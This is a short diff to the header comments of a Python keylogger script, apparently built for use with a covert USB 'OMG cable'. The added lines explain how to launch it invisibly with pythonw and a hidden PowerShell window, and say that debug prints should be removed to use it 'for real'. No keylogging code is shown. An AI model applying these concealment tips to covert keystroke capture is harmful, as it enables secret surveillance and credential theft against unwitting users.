@@ -3,8 +3,10 @@
 #pip install pywin32
 #pip install requests
 #pip install easygui
-#run powershell >  pythonw "C:\Users\mrgig\Desktop\OMG CABLE STUFF\python keylogger test.py"
+#run powershell >  pythonw "C:\Path\Path\python keylogger test.py"
+##pythonw = pythonwithoutwindow
 # powershell -WindowStyle Hidden
+###Hides powershellwindow
 # //python keylogging program
 
 ## You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
